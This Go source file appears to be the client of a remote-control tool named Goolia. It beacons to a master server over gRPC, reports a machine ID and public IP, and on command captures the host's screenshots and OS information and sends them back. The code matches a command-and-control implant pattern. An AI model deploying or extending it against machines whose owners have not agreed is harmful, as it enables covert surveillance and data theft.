package main

import (
	"context"
	"encoding/json"
	"io"
	"log"
	"runtime"
	"time"

	"github.com/NukeDev/Goolia/client/utils"
	pb "github.com/NukeDev/Goolia/proto"
	"github.com/denisbrodbeck/machineid"
	externalip "github.com/glendc/go-external-ip"
	"google.golang.org/grpc"
)

//Client local struct
type Client struct {
	ID        string
	IPAddress string
	OS        string
}

var localClient Client
var commandWaitingList []string

func main() {

	for {
		ClientProcess()
	}

}

//ClientProcess - Main instance
func ClientProcess() {
	for {
		time.Sleep(time.Second * 5)
		// dail server
		conn, err := grpc.Dial(":50005", grpc.WithInsecure(), grpc.WithTimeout(time.Second*10000))
		if err != nil {
			log.Printf("Can't connect to Master Server!! - %v", err)
			continue
		}

		//generate client data
		localClient.Generate()
		// create stream
		client := pb.NewComClient(conn)

		stream, err := client.HandleCommands(context.Background())
		if err != nil {
			log.Printf("There was an error while opening the stream - %v", err)
			continue
		}
		ctx := stream.Context()
		done := make(chan bool)

		// first goroutine sends ping requests to master servers to wait commands
		go func() {
			for {

				req := pb.Request{ClientID: localClient.ID, ClientIPAddress: localClient.IPAddress, Command: "ping", Data: nil}
				if err := stream.Send(&req); err != nil {
					log.Printf("Can't send PING request to Master Server - %v", err)
					log.Println("Reloading connection...")
					break
				}
				time.Sleep(time.Second * 10)
			}

		}()

		// second goroutine receives data from stream
		// if stream is finished it closes done channel
		go func() {
			for {
				resp, err := stream.Recv()
				if err == io.EOF {
					log.Printf("%v", err)
					log.Println("Reloading connection...")
					break
				}
				if err != nil {
					log.Printf("Can't receive on opened channel %v", err)
					log.Println("Reloading connection...")
					break
				}

				switch resp.Command {
				case "ping":
					{

					}
				case "osinfo":
					{
						info, err := utils.GetOsInfo()
						if err != nil {
							log.Printf("%v", err)
						}

						b, err := json.Marshal(info)

						if err != nil {
							log.Printf("%v", err)

						}

						if err := localClient.Send(resp.Command, b, stream); err != nil {
							break
						}

					}
				case "screenshot":
					{
						myShots := utils.GetClientScreenshots()

						if len(myShots) > 0 {

							b, err := json.Marshal(myShots)

							if err != nil {
								log.Printf("%v", err)

							}

							if err := localClient.Send(resp.Command, b, stream); err != nil {
								break
							}
						}

					}
				case "not-found":
				default:
					{
						log.Printf("No command found as %s", resp.Command)
					}
				}
			}
		}()

		// third goroutine closes done channel
		// if context is done
		go func() {
			<-ctx.Done()
			if err := ctx.Err(); err != nil {
				log.Println(err)
			}
			close(done)
		}()

		<-done
		log.Printf("Connection finished...")
		log.Println("Reloading connection...")
	}
}

//Generate Client Unique ID and Gets Public IPAddress
func (cl *Client) Generate() {
	id, err := machineid.ProtectedID("GooliaClient")
	if err != nil {
		log.Print(err)
	}
	cl.ID = id

	consensus := externalip.DefaultConsensus(nil, nil)

	ip, err := consensus.ExternalIP()
	if err == nil {
		cl.IPAddress = (ip.String())
	} else {
		cl.IPAddress = "undefined"
	}

	cl.OS = runtime.GOOS
}

//Send response to server
func (cl *Client) Send(command string, data []byte, stream pb.Com_HandleCommandsClient) error {
	req := pb.Request{ClientID: cl.ID, ClientIPAddress: cl.IPAddress, Command: command, Data: data}

	if err := stream.Send(&req); err != nil {
		log.Printf("can not send %s to master server %v", command, err)
		return err
	}
	log.Printf("Sending %s to master server\n", command)
	return nil

}
